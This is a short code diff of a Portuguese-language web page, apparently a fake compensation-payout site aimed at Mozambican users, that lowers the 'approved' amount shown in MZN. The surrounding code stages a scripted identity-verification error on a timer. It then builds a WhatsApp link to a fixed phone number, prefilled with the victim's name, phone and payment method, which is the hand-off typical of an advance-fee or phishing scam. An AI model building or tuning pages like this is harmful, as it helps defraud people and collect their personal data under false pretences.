@@ -616,7 +616,7 @@
             <div class="amount-box">
                 <div class="approved-badge"><i class="fas fa-check"></i> APROVADO</div>
                 <p>VALOR DISPONÍVEL PARA LEVANTAMENTO:</p>
-                <h1>19.462,82 MZN</h1>
+                <h1>17.332,82 MZN</h1>
                 <p style="font-size: 11px; margin-top: 8px; color: #666;">*Válido apenas para o titular destes dados.</p>
             </div>
             
@@ -910,7 +910,7 @@
 
             setTimeout(() => {
                 let phoneNumber = "258864688021"; 
-                let message = encodeURIComponent(`*Saudações*, tentei receber a minha indenização no valor de *19.462,82* via ${userData.metodo} através do número *${userData.telefone}*, mas deu erro de verificação de identidade. O meu nome é *${userData.nome}*. Como posso proceder para receber o valor?`);
+                let message = encodeURIComponent(`*Saudações*, tentei receber a minha indenização no valor de *17.332,82* via ${userData.metodo} através do número *${userData.telefone}*, mas deu erro de verificação de identidade. O meu nome é *${userData.nome}*. Como posso proceder para receber o valor?`);
                 document.getElementById('whatsapp-link').href = `https://wa.me/${phoneNumber}?text=${message}`;
 
                 goToScreen(7); 
